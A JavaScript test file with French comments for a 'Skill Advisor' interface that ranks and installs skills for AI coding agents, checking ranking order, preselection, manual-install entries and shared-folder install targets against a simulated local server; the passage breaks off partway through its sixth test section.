// Parcours Conseil et Installation : classement, présélection, cibles d'installation, skills retenus, conflits,
// dossier du projet, entrées « Installation à la main », comptes lus dans l'état réel.
// Même approche que live.mjs : les fichiers de build.mjs chargés dans un contexte vm, avec un faux serveur (fetch simulé).
// Run: node test/conseil.mjs   (no dependencies, no network, no disk write)
import fs from 'node:fs';
import vm from 'node:vm';
import path from 'node:path';
import { fileURLToPath } from 'node:url';

const root = path.resolve(path.dirname(fileURLToPath(import.meta.url)), '..');
const buildSrc = fs.readFileSync(path.join(root, 'build.mjs'), 'utf8');
const files = [...buildSrc.match(/const JS = \[([\s\S]*?)\];/)[1].matchAll(/'([^']+)'/g)].map((m) => m[1]);

let fails = 0, checks = 0;
function ok(cond, msg) { checks++; if (!cond) { fails++; console.error('FAIL', msg); } }
const BAD = /undefined|NaN|\[object Object\]|\bnull\b/;
const ours = (html) => String(html).replace(/<!--a-->[\s\S]*?<!--\/a-->/g, '');
function clean(label, html) {
  const h = ours(html), m = h.match(BAD);
  ok(!m, label + (m ? ' contains "' + m[0] + '": …' + h.slice(Math.max(0, h.search(BAD) - 80), h.search(BAD) + 60) : ''));
}
const tick = async (n = 8) => { for (let i = 0; i < n; i++) await new Promise((r) => setTimeout(r, 0)); };
/* Texte lisible d'un rendu : sans balises, sans textes d'auteur. */
const text = (html) => ours(html).replace(/<[^>]+>/g, ' ').replace(/&#39;/g, '’').replace(/&amp;/g, '&').replace(/\s+/g, ' ');

/* ---------- minuteries pilotées : rien ne part tout seul, le test décide ---------- */
function timers() {
  const q = []; let n = 0;
  return {
    set(fn, ms) { const id = ++n; q.push({ id, fn, ms: ms || 0 }); return id; },
    clear(id) { const i = q.findIndex((x) => x.id === id); if (i > -1) q.splice(i, 1); },
    flush() { let g = 0; while (q.length && g++ < 500) q.shift().fn(); }
  };
}

/* ---------- faux serveur ---------- */
const HOME = '/Users/test';
const TOKEN = 'b'.repeat(64);
const A = (id, name, o = {}) => Object.assign({ id, name, detected: true, top: true, universal: false, globalDir: null, custom: false, hidden: false, target: false, count: 0 }, o);
function baseState(over = {}) {
  return Object.assign({
    mode: 'live', os: 'mac', home: HOME, cwd: HOME + '/ailleurs', version: '1.0.0', project: null,
    catalog: { source: 'bundled', generatedAt: '2026-11-12T17:23:56.759Z' },
    agents: [
      A('claude-code', 'Claude Code', { globalDir: HOME + '/.claude/skills' }),
      A('cursor', 'Cursor', { universal: true, globalDir: HOME + '/.agents/skills' }),
      A('gemini-cli', 'Gemini CLI', { universal: true, globalDir: HOME + '/.agents/skills' }),
      A('windsurf', 'Windsurf', { globalDir: HOME + '/.codeium/windsurf/skills' }),
      A('codex', 'Codex', { detected: false, universal: true, globalDir: HOME + '/.agents/skills' }),
      A('custom-1', 'Mon outil', { detected: false, top: false, custom: true, globalDir: '/opt/mon outil/skills' })
    ],
    mine: [], backups: [], settings: { version: 1, custom: [], hidden: [], targets: [] }
  }, over);
}
function makeServer(state) {
  const srv = { state: state || baseState(), log: [], installReply: null, projectReply: null, offline: false };
  srv.fetch = function (url, opts = {}) {
    const headers = opts.headers || {};
    const entry = { url, method: opts.method || 'GET', token: headers['X-SA-Token'], body: opts.body ? JSON.parse(opts.body) : undefined };
    srv.log.push(entry);
    if (srv.offline) return Promise.reject(new TypeError('Failed to fetch'));
    const reply = (status, data) => ({ ok: status >= 200 && status < 300, status, json: () => Promise.resolve(JSON.parse(JSON.stringify(data))) });
    const b = entry.body || {};
    if (url === '/api/state') return Promise.resolve(reply(200, srv.state));
    if (url === '/api/skills/install') {
      const r = srv.installReply ? srv.installReply(b) : { installed: b.items.map((i) => i.skill), held: [], conflicts: [], skipped: [], failed: [] };
      return Promise.resolve(reply(200, Object.assign({ held: [], conflicts: [], skipped: [], failed: [], installed: [] }, r, { state: srv.state })));
    }
    if (url === '/api/project') {
      const r = srv.projectReply ? srv.projectReply(b) : { status: 200 };
      if (r.status !== 200) return Promise.resolve(reply(r.status, r.body));
      srv.state.project = b.dir;
      return Promise.resolve(reply(200, { state: srv.state }));
    }
    /* Routes de lecture que live.js peut appeler au démarrage : réponse vide, jamais d'erreur. */
    if (url === '/api/search-data') return Promise.resolve(reply(200, { source: 'bundled', generatedAt: null, search: null }));
    if (url === '/api/skills/check') return Promise.resolve(reply(200, { outdated: [] }));
    return Promise.resolve(reply(404, { error: 'NOT_FOUND', message: 'Route inconnue.' }));
  };
  srv.installs = () => srv.log.filter((e) => e.url === '/api/skills/install');
  return srv;
}

/* ---------- chargement de l'interface ---------- */
function load(srv) {
  const T = timers();
  const store = {};
  const win = { matchMedia: null, setTimeout: T.set, clearTimeout: T.clear, Promise, JSON, Date, addEventListener() {}, removeEventListener() {},
    location: { pathname: '/', search: '', reload() {} }, history: { replaceState() {} },
    sessionStorage: { getItem: (k) => (k in store ? store[k] : null), setItem: (k, v) => { store[k] = String(v); }, removeItem: (k) => { delete store[k]; } },
    localStorage: { getItem: () => null, setItem() {}, removeItem() {} } };
  if (srv) { win.SA_LIVE = { token: TOKEN }; win.fetch = srv.fetch; }
  win.console = { log() {}, warn() {}, error(...a) { if (String(a[0]).indexOf('[Skill Advisor]') !== 0) console.error(...a); } };
  win.window = win;
  win.document = {
    readyState: 'complete', hidden: false, addEventListener() {}, removeEventListener() {}, getElementById() { return null; },
    querySelector() { return null; }, querySelectorAll() { return []; }, documentElement: { getAttribute() { return null; }, setAttribute() {} }
  };
  const ctx = vm.createContext(win);
  for (const f of files) vm.runInContext(fs.readFileSync(path.join(root, 'src', f), 'utf8'), ctx, { filename: f });
  const SA = win.SA;
  SA.wentTo = [];
  return { SA, T, win };
}
/* Vue montée sur une fausse racine : les écoutes sont rappelées à la main. */
function mount(SA, view, fields = {}) {
  const h = {};
  const rootEl = { addEventListener(t, f) { (h[t] = h[t] || []).push(f); }, querySelector(sel) { return fields[sel] || null; }, querySelectorAll() { return []; }, isConnected: true, contains() { return true; } };
  SA.views[view].mount(rootEl);
  return { fire(type, target) { (h[type] || []).forEach((f) => f({ target, currentTarget: rootEl, preventDefault() {}, stopPropagation() {} })); }, fields };
}
/* Cible d'un clic : un bouton qui porte ces attributs ; closest() répond aux sélecteurs [attr], aux sélecteurs listés, et à « button ». */
function el(attrs, also = []) {
  const o = { attrs, disabled: false, value: attrs.value || '', id: attrs.id || '',
    hasAttribute(n) { return n in attrs; }, getAttribute(n) { return n in attrs ? attrs[n] : null; }, focus() {},
    closest(sel) {
      if (also.includes(sel)) return o;
      return sel.split(',').map((s) => s.trim()).some((s) => { const m = s.match(/^\[([\w-]+)\]$/); return m && m[1] in attrs; }) ? o : null;
    } };
  return o;
}
const idOf = (SA, name, src) => { const it = SA.search.items.find((x) => x[1] === name && (!src || x[2] === src)); return it ? it[0] : null; };
const stubGo = (SA) => { SA.go = (n) => { SA.wentTo.push(n); return true; }; SA.setRoute = (r) => { SA.wentTo.push(r); return true; }; };

/* ======================================================= 1. classement (constats 25 et 90) */
{
  const { SA } = load();
  const rank = (g, a) => SA.reco.rank(g, a);
  const names = (l) => l.map((r) => r.it[1]);
  const key = (r) => r.rel * 12 + r.it[6];
  const off = (r) => !!(r.off && r.off.length);

  /* Six jeux de réponses du constat 25 : le skill lié à une autre option passe après ceux qui répondent, et n'est plus dans les trois premiers. */
  const CASES = [
    ['devops', { cloud: 'aws', tool: 'k8s', needs: ['monitor'] }, ['azure-diagnostics', 'azure-ai'], ['aws-containers', 'kubernetes-patterns', 'aws-serverless']],
    ['securite', { type: 'nsp', stack: 'azure', needs: ['nsp'] }, ['firebase-security-rules-auditor'], ['azure-compliance']],
    ['database', { engine: 'mongo', tool: 'nsp', needs: ['nsp'] }, ['supabase-postgres-best-practices'], ['prisma-mongodb-upgrade']],
    ['app', { type: 'mobile', os: 'android', tech: 'kotlin', needs: ['ui'] }, ['write-swift', 'expo-module'], []],
    ['desktop-jeu', { engine: 'unity', type: 'nsp', needs: ['nsp'] }, ['three', 'threejs-fundamentals'], ['unity-ecs-patterns']],
    ['ecommerce', { platform: 'wordpress', pay: 'nsp', needs: ['nsp'] }, ['stripe-best-practices', 'upgrade-stripe'], ['wp-plugin-directory-guidelines']]
  ];
  for (const [g, a, rivals, good] of CASES) {
    const l = rank(g, a), n = names(l), tag = g + ' ' + JSON.stringify(a);
    ok(l.length >= 12, `1: ${tag} keeps at least 12 proposals: ${l.length}`);
    for (const r of rivals) {
      const row = l.find((x) => x.it[1] === r);
      ok(row && off(row), `1: ${tag}: ${r} is marked as tied to another option`);
      ok(!n.slice(0, 3).includes(r), `1: ${tag}: ${r} is not in the first three: ${n.slice(0, 3).join(', ')}`);
      for (const k of good) ok(n.indexOf(k) > -1 && n.indexOf(k) < n.indexOf(r), `1: ${tag}: ${k} comes before ${r}`);
    }
    for (const k of good) ok(l.some((x) => x.it[1] === k && !off(x)), `1: ${tag}: ${k} is not marked as tied to another option`);
    /* Ordre : tous les « hors sujet » après les autres ; dans chaque groupe, points puis note, puis installations. */
    const firstOff = l.findIndex(off);
    ok(firstOff === -1 || l.slice(firstOff).every(off), `1: ${tag}: every skill tied to another option comes last`);
    for (let i = 1; i < l.length; i++) {
      if (off(l[i - 1]) !== off(l[i])) continue;
      const a0 = l[i - 1], b0 = l[i];
      ok(key(a0) > key(b0) || (key(a0) === key(b0) && a0.it[3] >= b0.it[3]), `1: ${tag}: order broken between ${a0.id} (${key(a0)}) and ${b0.id} (${key(b0)})`);
    }
    ok(l.filter(off).every((r) => r.off.every((x) => typeof x === 'string' && x)), `1: ${tag}: the other option is named`);
  }

  /* Trois premiers, figés le 15/11/2026 sur la copie de la base du 12/11/2026 : à mettre à jour exprès quand le catalogue ou les règles changent. */
  const TOP3 = [
    ['devops', { cloud: 'aws', tool: 'k8s', needs: ['monitor'] }, ['aws-containers', 'kubernetes-patterns', 'aws-serverless']],
    ['site', { type: 'vitrine', tech: 'next', host: 'vercel', needs: ['design'] }, ['web-design-guidelines', 'vercel-react-best-practices', 'next-dev-loop']],
    ['database', { engine: 'mongo', tool: 'nsp', needs: ['nsp'] }, ['prisma-mongodb-upgrade', 'claude-api', 'prisma-client-api']],
    ['desktop-jeu', { engine: 'unity', type: 'nsp', needs: ['nsp'] }, ['unity-ecs-patterns', 'game-engine', 'game-feel']],
    ['ecommerce', { platform: 'wordpress', pay: 'nsp', needs: ['nsp'] }, ['wp-plugin-directory-guidelines', 'cross-border-ecommerce', 'agent-payment-x402']],
    ['frontend', { fw: 'next', host: 'vercel', needs: ['perf'] }, ['next-cache-components-adoption', 'vercel-react-best-practices', 'next-dev-loop']],
    ['backend', { lang: 'go', api: 'rest', needs: ['tests'] }, ['golang-testing', 'tdd', 'test-driven-development']]
  ];
  for (const [g, a, want] of TOP3) {
    const got = names(rank(g, a)).slice(0, 3);
    ok(got.join() === want.join(), `1: top 3 for ${g} ${JSON.stringify(a)}: got ${got.join(', ')}, expected ${want.join(', ')}`);
  }

  /* Cas négatifs : une option voisine ou un nom d'éditeur ne suffit pas à écarter un skill. */
  const nx = rank('frontend', { fw: 'next', host: 'nsp', needs: ['nsp'] });
  ok(nx.some((r) => r.it[1] === 'vercel-react-best-practices' && !off(r)), '1: Next.js chosen: a React skill is not pushed down');
  ok(nx.some((r) => r.it[1] === 'vue-best-practices' && off(r)), '1: Next.js chosen: a Vue skill is pushed down');
  const cf = rank('site', { type: 'vitrine', tech: 'next', host: 'cloudflare', needs: ['design'] });
  for (const k of ['vercel-react-best-practices', 'web-design-guidelines']) ok(cf.some((r) => r.it[1] === k && !off(r)), '1: Cloudflare hosting: ' + k + ' (source vercel-labs) is not pushed down');
  const tw = rank('site', { type: 'vitrine', tech: 'astro', host: 'nsp', needs: ['design'] });
  ok(tw.every((r) => !/tailwind|css/.test(r.it[1]) || !off(r)), '1: Astro chosen: CSS and Tailwind skills are not pushed down');
  ok(rank('app', { type: 'mobile', os: 'multi', tech: 'nsp', needs: ['ui'] }).every((r) => !off(r)), '1: « Plusieurs » plateformes : aucun skill écarté');
  ok(rank('devops', { cloud: 'nsp', tool: 'nsp', needs: ['nsp'] }).every((r) => !off(r)), '1: « Je ne sais pas » : aucun skill écarté');
  /* La même technologie choisie dans une autre question n'est pas un hors-sujet. */
  const mix = rank('data', { source: 'csv', tool: 'sql', out: 'dash', needs: ['clean'] });
  ok(mix.some((r) => r.it[1] === 'sql-optimization-patterns' && !off(r)), '1: CSV source, SQL tool: an SQL skill is not pushed down');
  /* Les questions déclarées exclusives existent et sont à choix unique. */
  for (const g of Object.keys(SA.reco.excl || {})) for (const qid of SA.reco.excl[g]) {
    const q = (SA.data.goals[g] || { qs: [] }).qs.find((x) => x.id === qid);
    ok(q && !q.multi, `1: exclusive question ${g}.${qid} exists and is single-choice`);
  }
  ok(SA.reco.excl && Object.keys(SA.reco.excl).length >= 10, '1: exclusive questions are declared');

  /* La vue affiche les lignes dans l'ordre du classement, avec la mention de l'autre option. */
  SA.initState({ route: 'wizard', step: 3, goal: 'devops', answers: { cloud: 'aws', tool: 'k8s', needs: ['monitor'] }, dbReady: true, mine: [] });
  const html = SA.views.resultats.render();
  const shown = [...html.matchAll(/<li class="rs-row[^"]*"[^>]*data-id="([^"]+)"/g)].map((m) => m[1]);
  const want = rank('devops', SA.state.answers).slice(0, shown.length).map((r) => r.id);
  ok(shown.length === 12 && shown.join() === want.join(), '1: results view follows the ranking order');
  const pre = SA.cart.list().map((id) => SA.item(id)[1]);
  ok(pre.length === 3 && !pre.some((n) => /azure/.test(n)), '1: AWS chosen: no Azure skill preselected: ' + pre.join(', '));
  SA.state.recoShown = 60;
  ok(/Concerne plutôt : Azure/.test(text(SA.views.resultats.render())), '1: a pushed-down skill says which other option it is about');
  /* Présélection : seulement des skills qui répondent à une réponse précise (constat 25). */
  for (const [g, a0] of [['database', { engine: 'mongo', tool: 'nsp', needs: ['nsp'] }], ['ecommerce', { platform: 'wordpress', pay: 'nsp', needs: ['nsp'] }], ['desktop-jeu', { engine: 'unity', type: 'nsp', needs: ['nsp'] }]]) {
    SA.initState({ route: 'wizard', step: 3, goal: g, answers: a0, dbReady: true, mine: [] });
    SA.views.resultats.render();
    const l = rank(g, a0), picked = SA.cart.list();
    ok(picked.length >= 1 && picked.every((id) => { const r = l.find((x) => x.id === id); return r && r.why.length && !off(r); }), `1: ${g}: preselection only answers a precise reply: ` + picked.join(', '));
  }
}

/* ======================================================= 2. entrées « Installation à la main » (constat 6) */
{
  const { SA } = load();
  const ios = idOf(SA, 'ios-design'), taste = idOf(SA, 'ui-taste'), comp = idOf(SA, 'react:components'), fine = idOf(SA, 'find-skills', 'vercel-labs/skills');
  ok(typeof SA.reco.manual === 'function' && !!SA.reco.manual(ios) && !!SA.reco.manual(taste) && !!SA.reco.manual(comp), '2: sources outside GitHub and unsupported names are told apart');
  ok(SA.reco.manual(fine) === '', '2: an owner/repo skill is installable');
  const NAME = /^[A-Za-z0-9][A-Za-z0-9._-]{0,127}$/, SRC = /^[\w.-]+\/[\w.-]+$/;
  const can = (it) => NAME.test(it[1]) && ((SRC.test(it[2]) && !it[2].split('/').some((s) => s.charAt(0) === '.')) || /^https:\/\/[^\/\s]+/.test(it[2]));
  const wrong = SA.search.items.filter((it) => !!SA.reco.manual(it[0]) === can(it));
  ok(wrong.length === 0, '2: manual() follows the contract rules on every catalogue entry: ' + wrong.slice(0, 3).map((it) => it[0]).join(', '));
  ok(SA.search.items.filter((it) => SA.reco.manual(it[0])).length === 60, '2: 60 entries of this catalogue cannot be installed by the app');
  for (const id of [ios, taste, comp]) {
    const r = SA.reco.manual(id);
    ok(r.split(/\s+/).length <= 20 && !/—/.test(r) && /\.$/.test(r), '2: reason is one short sentence: ' + r);
  }
  /* La sélection les refuse, quel que soit le chemin. */
  SA.initState({ route: 'recherche', dbReady: true, mine: [] });
  ok(SA.cart.add(ios) === false && SA.cart.toggle(taste) === false && SA.cart.count() === 0, '2: a manual entry cannot be added to the selection');
  ok(SA.cart.add(fine) === true && SA.cart.count() === 1, '2: an installable entry still can');
  /* Conseil : marqué, case coupée, jamais présélectionné (parcours du constat). */
  SA.initState({ route: 'wizard', step: 3, goal: 'mobile', answers: { os: 'ios', tech: 'swift', needs: ['design'] }, dbReady: true, mine: [] });
  const html = SA.views.resultats.render();
  const row = (html.match(new RegExp('<li class="rs-row[^>]*data-id="' + ios.replace(/[.]/g, '\\.') + '"[\\s\\S]*?</li>')) || [''])[0];
  ok(row && /Installation à la main/.test(row), '2: results: the row is marked « Installation à la main »');
  ok(row && !/data-cart-add/.test(row) && /disabled/.test(row), '2: results: its checkbox is off and adds nothing');
  ok(row && text(row).includes(SA.reco.manual(ios)), '2: results: the one-line reason is shown');
  ok(SA.cart.count() === 3 && !SA.cart.has(ios), '2: results: never preselected: ' + SA.cart.list().join(', '));
  /* Recherche et détail. */
  SA.initState({ route: 'recherche', dbReady: true, mine: [], search: { q: 'ui-taste', cat: '', min: 0, off: false, warn: 'tous', sort: 'note', shown: 30 } });
  const sr = SA.views.recherche.render();
  ok(/Installation à la main/.test(sr) && !new RegExp('data-cart-add="' + taste.replace(/[.]/g, '\\.') + '"').test(sr), '2: search: badge instead of the add button');
  ok(/href="https:\/\/skills\.sh\/uizze\.sh\/ui-taste"/.test(sr), '2: search: link to the skills.sh page');
  const dh = SA.detail.html(ios);
  ok(/Installation à la main/.test(dh) && !/data-cart-add/.test(dh), '2: detail: no add button, the reason instead');
  clean('2: results with a manual entry', html); clean('2: search with a manual entry', sr); clean('2: detail of a manual entry', dh);
}

/* ======================================================= 3. changement d'objectif (constat 26) */
{
  const { SA, T } = load();
  stubGo(SA);
  SA.initState({ route: 'wizard', step: 3, goal: 'devops', answers: { cloud: 'azure', tool: 'docker', needs: ['deploy'] }, dbReady: true, mine: [] });
  SA.views.resultats.render();
  const first = SA.cart.list().slice();
  ok(first.length === 3, '3: three skills preselected for the first goal');
  /* Retour à l'étape 1, autre objectif. */
  const ob = mount(SA, 'objectif');
  ob.fire('click', el({ 'data-goal': 'ia' }));
  ok(SA.state.goal === 'ia' && SA.wentTo.includes(2), '3: the other goal is chosen');
  ok(SA.cart.count() === 0, '3: the automatic preselection of the old goal is cleared: ' + SA.cart.list().join(', '));
  SA.state.answers = { type: 'mcp', sdk: 'nsp', needs: ['nsp'] }; SA.state.step = 3;
  SA.views.resultats.render();
  const second = SA.cart.list().slice();
  ok(second.length === 3 && !second.some((id) => first.includes(id)), '3: the new goal gets its own preselection');
  ok(/Installer 3 skills/.test(SA.views.resultats.actions().pop().label), '3: the button counts the skills of the new goal');
  /* Un choix fait à la main reste : un coché d'office décoché puis recoché, un ajout depuis la liste. */
  T.flush();
  SA.cart.remove(second[0]); SA.cart.add(second[0]);
  const extra = SA.reco.rank('ia', SA.state.answers).map((r) => r.id).find((id) => !SA.cart.has(id) && !SA.reco.manual(id));
  SA.cart.add(extra);
  ob.fire('click', el({ 'data-goal': 'devops' }));
  ok(SA.state.goal === 'devops', '3: back to the first goal');
  ok(SA.cart.has(second[0]) && SA.cart.has(extra) && SA.cart.count() === 2, '3: manual choices are kept, automatic ones are dropped: ' + SA.cart.list().join(', '));
  /* Sélection vidée, retour au premier objectif avec les mêmes réponses : la présélection revient. */
  SA.cart.remove(second[0]); SA.cart.remove(extra);
  SA.state.answers = { cloud: 'azure', tool: 'docker', needs: ['deploy'] }; SA.state.step = 3;
  SA.views.resultats.render();
  ok(SA.cart.list().join() === first.join(), '3: coming back to the first goal preselects again');
  /* Mêmes réponses, sélection vidée exprès : pas de nouveau remplissage. */
  first.forEach((id) => SA.cart.remove(id));
  SA.views.resultats.render();
  ok(SA.cart.count() === 0, '3: a selection emptied on purpose is not filled again');
  /* Réponses changées : les cochés d'office restés tels quels sont remplacés. */
  SA.initState({ route: 'wizard', step: 3, goal: 'devops', answers: { cloud: 'azure', tool: 'docker', needs: ['deploy'] }, dbReady: true, mine: [] });
  SA.views.resultats.render();
  SA.state.answers = { cloud: 'aws', tool: 'k8s', needs: ['monitor'] };
  SA.views.resultats.render();
  const third = SA.cart.list().map((id) => SA.item(id)[1]);
  ok(third.length === 3 && !third.some((n) => /azure/.test(n)), '3: new answers replace the untouched automatic picks: ' + third.join(', '));
  /* « Nouveau projet » depuis le guide : même nettoyage. */
  SA.state.lastInstall = [idOf(SA, 'pdf')];
  SA.state.step = 5;
  SA.views.guide.actions()[0].on();
  ok(SA.state.goal == null && SA.cart.count() === 0, '3: « Nouveau projet » clears the automatic picks too');
}

/* ======================================================= 4. les 17 objectifs (constat 68) */
{
  const { SA, T } = load();
  stubGo(SA);
  SA.initState({ route: 'wizard' });
  const html = SA.views.objectif.render();
  const goals = Object.keys(SA.data.goals);
  ok(goals.length === 17, '4: 17 goals');
  const heads = [...html.matchAll(/<h2 class="ob-gh"[^>]*>([^<]+)<\/h2>/g)].map((m) => m[1]);
  ok(heads.length >= 3 && heads.length <= 4, '4: 3 or 4 group headings: ' + heads.join(' | '));
  ok(heads.every((h) => h.split(/\s+/).length <= 4), '4: headings are short');
  const grids = (html.match(/<ul class="ob-grid"/g) || []).length;
  ok(grids === heads.length, '4: one grid per heading, the same grid everywhere');
  ok(!/class="ob-row"/.test(html) && !/ob-list/.test(html), '4: no full-width rows left for the first three goals');
  const cells = [...html.matchAll(/<button type="button" class="ob-cell" data-goal="([^"]+)"/g)].map((m) => m[1]);
  ok(cells.length === 17 && new Set(cells).size === 17 && goals.every((g) => cells.includes(g)), '4: every goal is one tile of the same kind, shown once');
  ok(cells.slice(0, 3).join() === 'site,app,data', '4: the three most common goals come first');
  ok(/17 objectifs/.test(text(html)), '4: the lede says how many goals there are');
  /* Raccourcis : chaque tuile porte le sien, les touches suivent l'ordre affiché. */
  const kbd = [...html.matchAll(/class="kbd ob-ck"[^>]*>([^<]+)</g)].map((m) => m[1]);
  ok(kbd.length === 17 && new Set(kbd).size === 17, '4: every tile shows its own shortcut: ' + kbd.join(''));
  const V = SA.views.objectif;
  ok(V.order().join() === cells.join(), '4: order() follows the display order');
  ok(V.keys({ key: '1' }) === true && SA.state.goal === cells[0], '4: key 1 chooses the first tile');
  SA.initState({ route: 'wizard' });
  T.flush(); /* le choix précédent bloque les clics pendant la transition (700 ms) */
  ok(V.keys({ key: kbd[16].toLowerCase() }) === true && SA.state.goal === cells[16], '4: the last shortcut chooses the last tile: ' + SA.state.goal);
  ok(V.keys({ key: 'x' }) === false && V.keys({ key: '1', ctrlKey: true }) === false, '4: other keys are left alone');
  ok(Array.isArray(SA.data.goalGroups) && SA.data.goalGroups.reduce((n, g) => n + g.ids.length, 0) === 17, '4: groups hold the 17 goals');
}

/* ======================================================= 5. recherche : titre, comptes, date et source de la base (constats 17 et 49) */
{
  const { SA } = load();
  SA.initState({ route: 'recherche', dbReady: true });
  let h = text(SA.views.recherche.render());
  ok(/Chercher parmi les 1 551 skills les plus installés/.test(h), '5: the title counts the searchable skills: ' + h.slice(0, 120));
  ok(!/parmi 92 899/.test(h) && /92 899/.test(h) && /skills\.sh/.test(h), '5: the skills.sh total is given as such');
  ok(/Base du 12\/11\/2026 · copie fournie/.test(h), '5: date and source of the base (embedded copy)');
  SA.state.search = { q: 'zzzz-aucun', cat: '', min: 0, off: false, warn: 'tous', sort: 'note', shown: 30 };
  const raw = SA.views.recherche.render();
  h = text(raw);
  ok(/Aucun résultat parmi ces 1 551 skills/.test(h) && /href="https:\/\/skills\.sh/.test(raw), '5: empty state says the skill may exist on skills.sh');
  ok((raw.match(/data-sr-reset/g) || []).length === 1, '5: « Effacer les filtres » appears once');
  clean('5: search empty', raw);
  /* Conseil : le nombre annoncé est celui des skills notés, pas le total de skills.sh. */
  SA.initState({ route: 'wizard', step: 3, goal: 'site', answers: { type: 'vitrine', tech: 'next', host: 'vercel', needs: ['design'] } });
  ok(!/92 899/.test(text(SA.views.resultats.render())), '5: the loading text of the advice does not announce 92 899 skills');
}
{
  const srv = makeServer(baseState({ catalog: { source: 'online', generatedAt: '2026-11-12T17:23:56.759Z' } }));
  const { SA } = load(srv);
  ok(await SA.live.ready === true, '5: live state loaded');
  SA.state.route = 'recherche'; SA.state.dbReady = true;
  ok(/Base du 12\/11\/2026 · en ligne/.test(text(SA.views.recherche.render())), '5: live, online catalogue: « en ligne »');
  srv.state.catalog = { source: 'bundled', generatedAt: '2026-11-12T17:23:56.759Z' };
  await SA.live.refresh();
  ok(/Base du 12\/11\/2026 · copie fournie/.test(text(SA.views.recherche.render())), '5: live, bundled catalogue: « copie fournie »');
  /* Une base en ligne plus récente que la copie de la page : la page n'annonce pas « en ligne » pour sa propre copie. */
  srv.state.catalog = { source: 'online', generatedAt: '2027-01-05T08:00:00.000Z' };
  await SA.live.refresh();
  const t = text(SA.views.recherche.render());
  ok(/Base du (12\/11\/2026 · copie fournie|05\/01\/2027 · en ligne)/.test(t), '5: date and source always describe the same base: ' + (t.match(/Base du [^.]+/) || [''])[0]);
}

/* ======================================================= 6. étape 4 : cibles, dossier partagé, liens ou copies (constats 7 et 24) */
async function liveStep4(over, pickNames = ['find-skills', 'pdf']) {
  const srv = makeServer(baseState(over));
  const L = load(srv);
  const { SA } = L;
  await SA.live.ready;
  stubGo(SA);
  const picks = pickNames.map((n) => SA.search.items.find((it) => it[1] === n && it[6] != null));
  SA.state.route = 'wizard'; SA.state.step = 4; SA.state.cart = []; SA.state.inst = null;
  picks.forEach((it) => SA.cart.add(it[0]));
  const m = mount(SA, 'confirmation');
  const V = SA.views.confirmation;
  const install = async () => { const a = V.actions(); await a[a.length - 1].on(); await tick(); };
  return Object.assign(L, { srv, picks, m, V, install, html: () => V.render(), txt: () => text(V.render()) });
}
{
  const t = await liveStep4();
  const { SA, srv, picks, m, V } = t;
  ok(SA.cart.count() === 2, '6: two skills selected');
  let h = t.html(), x = text(h);
  clean('6: step 4 idle', h);
  ok(/Dossier partagé/.test(x), '6: one target named « Dossier partagé »');
  ok((h.match(/data-cf-shared/g) || []).length === 1, '6: one switch for the shared folder');
  ok(/Lu par Cursor, Gemini CLI/.test(x), '6: detected readers are listed under it: ' + (x.match(/Lu par[^.]*\./) || [''])[0]);
  ok(!/Codex/.test(x), '6: an undetected reader is not listed');
  ok(!/Installer dans Cursor/.test(h) && !/Installer dans Gemini CLI/.test(h), '6: readers cannot be ticked one by one');
  ok(/aria-label="Installer dans Claude Code"/.test(h) && /aria-label="Installer dans Windsurf"/.test(h) && /aria-label="Installer dans Mon outil"/.test(h), '6: one switch per own-folder agent and per custom agent');
  ok(x.includes(HOME + '/.agents/skills'), '6: the shared folder path is shown');
  /* Résumé : dossier partagé + liens, chemins réels. */
  const plan = (h.match(/<pre class="code"[^>]*><code>([\s\S]*?)<\/code><\/pre>/) || ['', ''])[1];
  for (const it of picks) {
    ok(plan.includes(HOME + '/.agents/skills/' + it[1]), '6: plan: shared folder path of ' + it[1]);
    ok(plan.includes(HOME + '/.claude/skills/' + it[1]) && plan.includes(HOME + '/.codeium/windsurf/skills/' + it[1]) && plan.includes('/opt/mon outil/skills/' + it[1]), '6: plan: one path per own-folder agent for ' + it[1]);
  }
  ok(/liens? vers le dossier partagé/.test(plan) && !/copie/.test(plan), '6: plan: links, no copy');
  ok(/Cursor, Gemini CLI/.test(plan) && !plan.includes(HOME + '/.cursor'), '6: plan: readers get no link of their own');
  ok(/Installer 2 skills dans 5 agents/.test(V.actions().pop().label), '6: the button counts the agents that will read the skills: ' + V.actions().pop().label);
  await t.install();
  let p = srv.installs().pop();
  ok(p && JSON.stringify(p.body) === JSON.stringify({ items: picks.map((it) => ({ source: it[2], skill: it[1] })), agents: ['shared', 'claude-code', 'windsurf', 'custom-1'], scope: 'global' }), '6: payload with the shared folder: ' + JSON.stringify(p && p.body));
  ok(SA.state.inst.phase === 'done', '6: install done');

  /* Sans le dossier partagé : une copie par agent, rien dans le dossier partagé. */
  const t2 = await liveStep4();
  t2.m.fire('click', el({ 'data-cf-shared': '' }));
  ok(!t2.SA.state.agents.cursor && !t2.SA.state.agents['gemini-cli'] && t2.SA.state.agents['claude-code'], '6: the shared switch turns every reader off together');
  ok(t2.SA.agentsOn().map((a) => a.id).join() === 'claude-code,windsurf,custom-1', '6: other screens read the same targets (SA.agentsOn)');
  h = t2.html();
  const plan2 = (h.match(/<pre class="code"[^>]*><code>([\s\S]*?)<\/code><\/pre>/) || ['', ''])[1];
  ok(/copies?/.test(plan2) && !/lien/.test(plan2.replace(/# [^\n]*commande[^\n]*/g, '')), '6: copies mode: the plan says copies, not links');
  ok(!plan2.includes(HOME + '/.agents/skills/' + t2.picks[0][1]), '6: copies mode: nothing listed in the shared folder');
  ok(/Rien n’est écrit dans le dossier partagé/.test(text(plan2)), '6: copies mode: the plan says the shared folder stays untouched');
  ok(plan2.includes(HOME + '/.claude/skills/' + t2.picks[0][1]), '6: copies mode: real path of the copy');
  ok(/aria-checked="false"[^>]*data-cf-shared|data-cf-shared[^>]*aria-checked="false"/.test(h), '6: the shared switch shows off');
  ok(/Installer 2 skills dans 3 agents/.test(t2.V.actions().pop().label), '6: copies mode: three agents');
  await t2.install();
  p = t2.srv.installs().pop();
  ok(p && JSON.stringify(p.body.agents) === '["claude-code","windsurf","custom-1"]', '6: payload without the shared folder: ' + JSON.stringify(p && p.body.agents));

  /* Un agent à dossier propre décoché. */
  const t3 = await liveStep4();
  t3.m.fire('click', el({ 'data-cf-agent': 'windsurf' }));
  await t3.install();
  ok(JSON.stringify(t3.srv.installs().pop().body.agents) === '["shared","claude-code","custom-1"]', '6: unticked own-folder agent left out');
  /* Rien de coché : pas d'installation. */
  const t4 = await liveStep4();
  t4.m.fire('click', el({ 'data-cf-shared': '' }));
  for (const id of ['claude-code', 'windsurf', 'custom-1']) t4.m.fire('click', el({ 'data-cf-agent': id }));
  ok(t4.V.actions().pop().disabled === true, '6: no target: the install button is off');
  await t4.install();
